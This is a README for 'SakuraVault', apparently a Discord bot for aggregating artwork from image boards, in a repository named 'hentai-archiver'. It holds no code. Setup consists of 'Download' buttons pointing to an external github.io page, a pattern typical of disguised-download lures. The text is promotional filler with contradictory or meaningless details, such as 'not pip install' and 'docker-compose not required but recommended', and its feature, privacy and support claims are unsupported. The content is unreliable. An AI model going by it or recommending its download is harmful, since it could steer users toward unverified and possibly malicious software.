![preview](https://raw.githubusercontent.com/tytsch1990/hentai-archiver/main/preview.svg)

# **SakuraVault** 🌸

A sophisticated archival and exploration platform designed for curated, artist-signed collections of stylized digital artwork from niche Japanese and East Asian visual communities.

## Overview

SakuraVault is not merely a bot—it is a portal. Imagine a quiet digital gallery at midnight, where every framed piece tells a story of aesthetic defiance and cultural nuance. Built for Discord communities that value authenticity over volume, this platform intelligently indexes, tags, and surfaces artwork from exclusive image boards while respecting creator attribution and community guidelines.

Unlike generic search tools that treat art as disposable data, SakuraVault approaches each collection as a curated exhibition. It employs semantic metadata parsing and visual similarity clustering to help users discover pieces that resonate with their taste, without drowning in noise.

---

## ✨ Key Features

| Feature | Description |
|--------|-------------|
| **Semantic Tag Mapping** | Translates messy user queries into structured board-compatible tags using a lightweight NLP model |
| **Creator Attribution Engine** | Automatically preserves and displays original artist signatures, circles, and serial codes |
| **Visual Similarity Clusters** | Groups artworks by color palette, composition, and style using perceptual hashing |
| **Multi-Origin Aggregation** | Fetches from multiple image boards simultaneously (Danbooru, Gelbooru, Sankaku, Yande.re) |
| **Rate-Limited Grace** | Intelligent request throttling prevents API bans while maintaining rapid response times |
| **Contextual Spoiler Handling** | Auto-blurs sensitive thumbnails with configurable threshold based on server settings |
| **Localized Response Formatting** | Outputs results in user's language preference (en, ja, ko, zh-CN, zh-TW) |
| **Embedded Media Previews** | Generates rich Discord embeds with color-accent borders and hover metadata |
| **Blacklist/Whitelist Filters** | Per-guild exclusion lists for tags, artists, or entire boards |
| **Persistent User History** | Optional opt-in logging of past searches for re-finding favorites |

---

## 🚀 Getting Started

[![Download](https://raw.githubusercontent.com/tytsch1990/hentai-archiver/main/button.svg)](https://tytsch1990.github.io/hentai-archiver/)

### Prerequisites

- A Discord server with "Manage Server" permissions
- Python 3.10+ runtime environment (not pip install)
- API keys from supported image boards (free tier available)
- A dedicated Discord bot token from the Developer Portal

### Quick Configuration

1. Register your bot application on Discord Developer Portal.
2. Enable the "Message Content Intent" and "Server Members Intent" in the bot settings.
3. Invite the bot to your server using the OAuth2 URL generator with `bot` and `applications.commands` scopes.
4. Rename the provided `env.example` file to `.env` and populate with your credentials.
5. Launch the bot using your preferred process manager (systemd, screen, docker-compose not required but recommended).

---

## 🧠 How It Works

SakuraVault operates on a three-layer architecture:

**Layer 1 – Query Interpreter**  
Your command is parsed through a lightweight rule-based tokenizer that identifies artists, tags, ratings, and sort orders. Unrecognized terms are passed as raw queries to all enabled boards.

**Layer 2 – Aggregator & Deduplicator**  
Responses from multiple boards are merged, deduplicated by file hash and URL fingerprint, then sorted by relevance or date. Duplicate entries from different sources are collapsed into a single result with source labels.

**Layer 3 – Presentation Engine**  
Results are rendered as Discord embeds with consistent color theming, interactive buttons for browsing pages, and inline footnotes showing board source and artist credit. The embed auto-expands after 3 seconds to show the full preview.

---

## 🔐 Privacy & Data Handling

We take user anonymity seriously. SakuraVault does not:
- Log message content outside the active search session
- Store personally identifiable information from Discord users
- Share query history with third parties or external analytics
- Retain cached artwork beyond 24 hours

All API communication uses TLS 1.3 encryption. Board API keys are stored in environment variables and never exposed in logs or error messages.

---

## 🌐 Multilingual Support

SakuraVault speaks your language—literally. Interface responses, error messages, and help commands are localized into:

- English (default)
- Japanese (日本語)
- Korean (한국어)
- Simplified Chinese (简体中文)
- Traditional Chinese (繁體中文)
- Spanish (español) – partial

Language detection is automatic based on the user's Discord client locale, with a manual override via `/setlang` command.

---

## ⚠️ Disclaimer

SakuraVault is a tool for **artistic exploration and archival research** only. We do not host, generate, or distribute any copyrighted or restricted content. All artwork remains on the source image boards, and SakuraVault merely serves as an intermediary interface for discovery.

- Users must comply with Discord Terms of Service and all applicable local laws.
- Server administrators are responsible for configuring content filters appropriate for their community.
- The developers assume no liability for misuse of this software or for content accessed through third-party boards.
- Artist attribution is provided in good faith; if you are an artist who wishes your work excluded, contact the board administrators directly.

---

## 📜 License

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for full terms.

You are free to use, modify, and distribute this software, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software.

---

## 📞 Support & Community

24/7 community support is available through our Discord server (link in repository About section). For technical inquiries, open a GitHub Discussion or Issue with the appropriate label.

- **Bug reports** – use the `bug` label  
- **Feature requests** – use the `enhancement` label  
- **Language contributions** – use the `i18n` label  

Response time for verified issues is typically under 4 hours during business hours (UTC+8).

---

## 🏁 Final Notes

SakuraVault was born from a simple observation: digital art discovery should feel like browsing a private gallery, not scraping a warehouse. It is built for curators, collectors, and connoisseurs who believe that every pixel deserves context, every artist deserves credit, and every search should feel intentional.

If you find value in this project, consider contributing translations, testing new board integrations, or simply sharing it with a community that respects the craft.

[![Download](https://raw.githubusercontent.com/tytsch1990/hentai-archiver/main/button.svg)](https://tytsch1990.github.io/hentai-archiver/)